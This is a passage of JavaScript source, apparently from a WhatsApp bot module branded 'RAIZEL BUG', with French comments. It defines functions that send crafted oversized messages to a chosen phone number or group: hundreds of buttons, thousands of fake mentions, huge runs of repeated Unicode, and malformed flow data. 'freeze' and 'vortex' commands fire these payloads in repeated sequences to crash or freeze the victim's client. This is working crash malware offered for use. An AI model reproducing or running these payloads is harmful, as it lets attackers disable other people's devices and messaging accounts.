        message: { extendedTextMessage: { text: hugeBody, contextInfo: { forwardingScore: 9999, isForwarded: true } } }
      }
    };
    await sock.relayMessage(target, payload, { participant: { jid: target } });
  } catch (err) {
    console.error("Erreur dans protocolbug7 :", err);
  }
}

async function protocolbug8(sock, target) {
  try {
    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { hasMediaAttachment: false },
            body: { text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐏𝐑𝐎𝐓𝐎𝐂𝐎𝐋𝟖͞⃟🩸✦" },
            nativeFlowMessage: { buttons: Array(800).fill({ name: "cta_call", buttonParamsJson: '{"status":"OK"}' }) }
          }
        }
      }
    };
    const msg = generateWAMessageFromContent(target, payload, {});
    await sock.relayMessage(target, msg.message, { participant: { jid: target } });
  } catch (err) {
    console.error("Erreur dans protocolbug8 :", err);
  }
}
async function xUi(sock, target) {
const Interactive = {
viewOnceMessage: {
message: {
interactiveMessage: {
contextInfo: {
remoteJid: "X",
stanzaId: "123",
participant: target,
mentionedJid: [
"0@s.whatsapp.net",
...Array.from({ length: 1900 }, () =>
"1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
),
],
quotedMessage: {
paymentInviteMessage: {
serviceType: 3,
expiryTimestamp: Date.now() + 1814400000,
},
forwardedAiBotMessageInfo: {
botName: "META AI",
botJid:
Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
creatorName: "Bot",
},
},
},
body: {
text:
" #4izxvelzExerct1st. " +
"ꦽ".repeat(50000) +
"ꦾ".repeat(50000),
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(10000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`,
},
{
name: "galaxy_message",
buttonParamsJson: JSON.stringify({
icon: "REVIEW",
flow_cta: "\0",
flow_message_version: "3",
}),
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: `Null ${"𑲭𑲭".repeat(10000)}`,
url: "https://Wa.me/stickerpack/4izxvelzexect",
merchant_url: "https://Wa.me/stickerpack/4izxvelzexect",
}),
},
{
name: "cta_app_link",
buttonParamsJson: JSON.stringify({
display_text: `4izxvelzExerc1st. ${"ꦽ".repeat(10000)}`,
android_app_metadata: {
url: "https://Wa.me/stickerpack/4izxvelzexect",
consented_users_url: "https://t.me/rizxvelzexct",
},
}),
},
{
name: "galaxy_message",
buttonParamsJson:
"{\"flow_message_version\":\"3\",\"flow_token\":\"unused\",\"flow_id\":\"1775342589999842\",\"flow_cta\":\"🩸ꢵ 𝐓‌‌𝐝‌𝐗‌ ꢵ 🩸\",\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"AWARD_CLAIM\",\"data\":{\"error_types\":[],\"campaigns\":[],\"categories\":[{\"id\":\"category_1\",\"title\":\"Unicam\"},{\"id\":\"category_2\",\"title\":\"Constantes\"},{\"id\":\"category_3\",\"title\":\"Referidos\",\"on-unselect-action\":{\"name\":\"update_data\",\"payload\":{\"subcategory_visibility\":false}},\"on-select-action\":{\"name\":\"update_data\",\"payload\":{\"subcategories\":[{\"id\":\"1\",\"title\":\"1 subcategory\"},{\"id\":\"2\",\"title\":\"2 subcategory\"}],\"subcategory_visibility\":true}}}],\"subcategory_visibility\":false}},\"flow_metadata\":{\"flow_json_version\":1000,\"data_api_protocol\":\"I'm dying and bleeding of my past\",\"data_api_version\":9999999,\"flow_name\":\"🩸ꢵ 𝐓‌‌𝐝‌𝐗‌ ꢵ 🩸\",\"categories\":[]},\"icon\":\"REVIEW\",\"has_multiple_buttons\":true}"
},
],
messageParamsJson: "{}",
},
},
},
},
};

await sock.relayMessage(target, Interactive, {
messageId: null,
userJid: target,
});
}

// ===================== COMMANDS EXPORTS =====================

const freeze = {
  name: "freeze",
  execute: async (sock, m, args, from, _, prefix, command) => {
    const q = args[0];
    if (!q) {
      return sock.sendMessage(from, { text: `📌 Exemple : ${prefix + command} 237xxxxxxxxxx` }, { quoted: m });
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await sock.sendMessage(from, {
      image: { url: global.imgCrL || DEFAULT_IMG },
      caption: `⚡ *FREEZE ACTIVÉ !*\n\n🎯 Cible : wa.me/${q.replace(/[^0-9]/g, "")}\n🧩 Module : *RAIZEL BUG V4 - Android/iOS Mix*`
    }, { quoted: m });

    await sleep(2000);

    try {
      await thunderblast_ios1(sock, target);
      await sleep(500);
      await apaya(sock, target);
      await sleep(500);
      await thunderblast_ios1(sock, target);
      await sleep(500);

      await alldelay(sock, target);
      await sleep(1000);
      await bulldozer(sock, target);
      await xUi(sock, target);
      await alldelay(sock, target);
      await sleep(500);
      if (typeof protocolbug8 === "function") await protocolbug8(sock, target);
      await sleep(500);
      if (typeof protocolbug6 === "function") await protocolbug6(sock, target, true);
      await sleep(500);
      if (typeof protocolbug7 === "function") await protocolbug7(sock, target);
      await sleep(500);

      if (typeof protocolbug8 === "function") await protocolbug8(sock, target);
      await sleep(500);
      if (typeof protocolbug6 === "function") await protocolbug6(sock, target, true);
      await sleep(500);
      if (typeof protocolbug7 === "function") await protocolbug7(sock, target);
      await sleep(500);

      await thunderblast_ios1(sock, target);
      await sleep(500);
      await xUi(sock, target);
      await thunderblast_ios1(sock, target);

      await sock.sendMessage(from, { text: `✅ *FREEZE terminé sur ${q}*` }, { quoted: m });
    } catch (err) {
      console.log("⚠️ Erreur pendant l'exécution de freeze :", err);
    }
  },
};

const Vortex = {
  name: "vortex",
  execute: async (sock, m, args, from) => {
    // Vérifie qu'on est bien dans un groupe
    if (!from || !from.endsWith("@g.us")) {
      return sock.sendMessage(from, { text: "❌ Cette commande doit être utilisée dans un groupe." }, { quoted: m });
    }

    const target = from;

    await sock.sendMessage(from, {
      image: { url: global.imgCrL || DEFAULT_IMG },
      caption: `⚡ *VORTEX ACTIVÉ !*\n\n🎯 Cible : *Ce Groupe*\n🛡️ Module : *RAIZEL BUG Vortex*`
    }, { quoted: m });

    await sleep(1500);

    try {
      await thunderblast_ios1(sock, target);
      await sleep(1200);
      await apaya(sock, target);
      await sleep(1200);
      await xUi(sock, target);
      await sleep(1200);
      await thunderblast_ios1(sock, target);
      await xUi(sock, target);
      await sleep(1500);

      // Boucles limitées pour éviter "overlimit"
      for (let i = 0; i < 3; i++) {
        await alldelay(sock, target);
        await sleep(2000);
        await thunderblast_ios1(sock, target);
      }

      await sock.sendMessage(from, { react: { text: "⚡", key: m.key } });
    } catch (err) {
      console.log("⚠️ Erreur dans Vortex :", err);
      await sock.sendMessage(from, { text: `❌ Erreur : ${err.message || err}` }, { quoted: m });
    }
  },
};

// ===================== EXPORTS =====================
export default [
  Vortex,
  freeze,
];

export {
  carousels2,
  Loc,
  xUi,
  thunderblast_ios1,
  callHome,
  CarouselX,
  KingDelayMess,
  KingBroadcast,
  DelayInvisNew,
  superdelayinvid,
  delayCrash,
  alldelay,
  apaya,
  bulldozer,
  protocolbug1,
  protocolbug2,
  protocolbug3,
  protocolbug4,
  protocolbug5,
  protocolbug6,
  protocolbug7,
  protocolbug8
};
